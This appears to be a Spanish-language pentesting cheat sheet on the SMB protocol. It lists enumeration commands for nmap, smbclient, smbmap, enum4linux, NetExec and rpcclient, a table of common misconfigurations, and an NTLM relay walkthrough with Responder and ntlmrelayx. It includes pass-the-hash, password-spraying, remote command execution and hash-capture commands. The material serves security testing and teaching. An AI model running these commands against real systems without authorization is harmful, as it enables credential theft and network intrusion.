# SMB — Server Message Block

SMB (Server Message Block) es el protocolo de compartición de archivos, impresoras y recursos de red de Windows. Opera principalmente en el puerto **445** (TCP). En versiones antiguas también usaba los puertos 137, 138 (UDP) y 139 (TCP) a través de NetBIOS.

SMB es uno de los vectores de ataque más explotados en redes Windows. Vulnerabilidades como **EternalBlue (MS17-010)** y el protocolo **NTLM** hacen de SMB un objetivo prioritario en cualquier pentest de infraestructura.

### Versiones de SMB

| Versión   | Sistema                    | Notas                                               |
| --------- | -------------------------- | --------------------------------------------------- |
| **SMBv1** | Windows XP, Server 2003    | Vulnerable a EternalBlue. Debe estar deshabilitado. |
| **SMBv2** | Windows Vista, Server 2008 | Más eficiente, mejoras de seguridad.                |
| **SMBv3** | Windows 8, Server 2012     | Cifrado end-to-end disponible.                      |

### Enumeración

#### Nmap

```bash
# Detección de versión y scripts básicos
nmap -sV -p 445,139 target
nmap -sC -sV -p 445,139 target

# Scripts específicos para SMB
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 target

# Detección de vulnerabilidades SMB
nmap --script smb-vuln* -p 445 target
nmap --script smb-vuln-ms17-010 -p 445 target   # EternalBlue
nmap --script smb-vuln-ms08-067 -p 445 target   # NetAPI
```

#### smbclient — conectar a shares

```bash
# Listar shares disponibles (null session)
smbclient -L //target -N            # -N = sin contraseña
smbclient -L //target -U ""         # usuario vacío

# Listar con credenciales
smbclient -L //target -U usuario%contraseña

# Conectar a un share
smbclient //target/share -N
smbclient //target/share -U usuario%contraseña

# Comandos dentro de smbclient
ls                  # listar contenido
get archivo         # descargar
mget *              # descargar todo
put archivo         # subir
cd directorio       # navegar
recurse ON          # modo recursivo
prompt OFF          # desactivar confirmación por archivo
mget *              # descargar recursivamente
```

#### smbmap — enumeración más completa

```bash
# Listar shares y permisos con null session
smbmap -H target

# Con credenciales
smbmap -H target -u usuario -p contraseña

# Acceso con hash NTLM (Pass-the-Hash)
smbmap -H target -u usuario -p 'aad3b435b51404eeaad3b435b51404ee:HASH_NT'

# Listar contenido de un share específico
smbmap -H target -r share_name

# Listar recursivamente
smbmap -H target -r share_name -R

# Buscar archivos por patrón
smbmap -H target -r share_name --dir-only
```

#### enum4linux — enumeración completa de Windows/Samba

```bash
# Enumeración completa
enum4linux -a target

# Opciones específicas:
enum4linux -U target    # usuarios
enum4linux -S target    # shares
enum4linux -G target    # grupos
enum4linux -P target    # política de contraseñas
enum4linux -n target    # información NetBIOS
enum4linux -o target    # OS info

# Versión mejorada (Python)
enum4linux-ng -A target
enum4linux-ng -A target -u usuario -p contraseña
```

#### NetExec (sucesor de CrackMapExec)

```bash
# Información básica del target
nxc smb target

# Null session
nxc smb target -u '' -p ''

# Con credenciales — verificar acceso
nxc smb target -u usuario -p contraseña

# Listar shares
nxc smb target -u usuario -p contraseña --shares

# Enumerar usuarios
nxc smb target -u usuario -p contraseña --users

# Enumerar grupos
nxc smb target -u usuario -p contraseña --groups

# Pass-the-Hash
nxc smb target -u usuario -H NTLM_HASH

# Ejecutar comando remoto (si se tiene acceso admin)
nxc smb target -u admin -p contraseña -x "whoami"

# Password spraying en toda una red
nxc smb 192.168.1.0/24 -u usuarios.txt -p 'Password123'
```

#### rpcclient — enumeración via RPC

```bash
# Conectar con null session
rpcclient -U "" target -N

# Con credenciales
rpcclient -U "usuario%contraseña" target

# Comandos dentro de rpcclient
srvinfo               # información del servidor
enumdomusers          # listar usuarios del dominio
enumdomgroups         # listar grupos
enumshares            # listar shares
querydominfo          # información del dominio
lookupnames admin     # obtener SID de un usuario
lookupsids S-1-5-...  # obtener usuario de un SID
```

### Riesgos y misconfiguraciones

| Riesgo                            | Descripción                                                                                                        |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Null Session**                  | Acceso a SMB sin credenciales. Permite enumerar usuarios, grupos, políticas y shares.                              |
| **Shares con permisos excesivos** | Shares accesibles a `Everyone` con permisos de lectura o escritura.                                                |
| **SMBv1 activo**                  | Vulnerable a EternalBlue (MS17-010) → RCE sin autenticación.                                                       |
| **NTLM Relay**                    | Con Responder + ntlmrelayx se pueden capturar hashes NTLMv2 y retransmitirlos para autenticarse en otros sistemas. |
| **Pass-the-Hash**                 | Los hashes NTLM pueden usarse directamente para autenticarse sin conocer la contraseña.                            |
| **Archivos sensibles en shares**  | Credenciales en scripts, archivos de configuración, backups en shares accesibles.                                  |
| **Guest account activo**          | La cuenta Guest puede dar acceso a shares sin credenciales válidas.                                                |

#### NTLM Relay con Responder

```bash
# Paso 1: envenenar LLMNR/NBT-NS para capturar hashes
sudo responder -I eth0 -rdwv

# Paso 2: retransmitir el hash a otro sistema (en otra terminal)
sudo ntlmrelayx.py -tf targets.txt -smb2support
# Si el usuario tiene permisos de admin en el target → SAM dump automático

# Con sesión interactiva
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

> **EternalBlue (MS17-010)** afecta a sistemas Windows sin el parche MS17-010. Si SMBv1 está activo y el sistema no está parcheado, el resultado es RCE sin autenticación. Verificar siempre con `nmap --script smb-vuln-ms17-010`.

> Los **archivos de configuración en shares** son uno de los hallazgos más frecuentes y valiosos en pentests internos. Buscar extensiones como `.config`, `.ini`, `.xml`, `.txt`, `.bat`, `.ps1` — suelen contener credenciales hardcodeadas.

